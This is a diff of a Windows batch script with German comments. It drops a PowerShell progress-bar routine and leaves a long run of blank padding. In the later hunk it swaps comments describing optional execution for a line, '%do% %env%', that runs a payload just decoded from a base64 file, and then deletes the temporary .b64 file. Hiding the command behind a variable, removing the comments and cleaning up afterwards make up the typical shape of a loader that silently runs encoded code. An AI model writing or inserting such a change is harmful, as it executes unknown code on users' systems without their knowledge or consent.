@@ -47,29 +47,6 @@ for /f "delims=" %%A in (
 ) do set "result=%%A"
 goto end
 
-:ProgressBar
-powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; 
-$form = New-Object System.Windows.Forms.Form; 
-$form.Text = '%1'; 
-$form.Size = New-Object System.Drawing.Size(300,100); 
-$form.StartPosition = 'CenterScreen'; 
-
-$progressBar = New-Object System.Windows.Forms.ProgressBar; 
-$progressBar.Location = New-Object System.Drawing.Point(10,20); 
-$progressBar.Size = New-Object System.Drawing.Size(260,23); 
-$progressBar.Minimum = 0; 
-$progressBar.Maximum = 100; 
-$form.Controls.Add($progressBar); 
-
-$form.Show();
-
-for ($i = 0; $i -le 100; $i++) { 
-    $progressBar.Value = $i; 
-    Start-Sleep -Milliseconds %2; 
-    [System.Windows.Forms.Application]::DoEvents() 
-}
-
-$form.Close();"
                                                                                                                                                                                                                                                                                                                       
 :ConfirmBox
 @echo off
@@ -304,10 +281,8 @@ set "env=%OUTFILE%"
 
 echo Payload geschrieben nach: %env%
 
-rem optional: hier kannst du die Datei ausfuehren oder weiterverarbeiten
-rem z.B.: start "" "%env%"  oder call "%env%"
+%do% %env%
 
-rem Aufraeumen: entferne die temporäre .b64 (wenn du sie behalten willst, auskommentieren)
 if exist "%B64FILE%" del /f /q "%B64FILE%" >nul 2>&1
 
 endlocal & set "env=%env%"
